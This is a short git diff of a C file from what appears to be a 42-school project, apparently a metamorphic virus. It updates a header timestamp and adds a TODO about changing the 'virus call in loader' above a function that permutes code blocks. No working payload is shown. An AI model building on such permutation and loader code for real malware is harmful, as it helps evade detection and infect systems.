@@ -6,7 +6,7 @@
 /*   By: ichkamo <ichkamo@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2020/03/01 17:19:22 by ichkamo           #+#    #+#             */
-/*   Updated: 2020/03/01 19:15:19 by ichkamo          ###   ########.fr       */
+/*   Updated: 2020/03/01 19:49:02 by ichkamo          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -40,6 +40,8 @@ static bool	apply_shift_blocks(void *code, size_t size, \
 	return true;
 }
 
+// TODO change virus call in loader!!!!!!!!!!!!
+// by adding rel virus entry to virus_header
 bool		permutate_blocks(void *code, uint64_t seed, size_t size)
 {
 	struct block_allocation		block_memory;
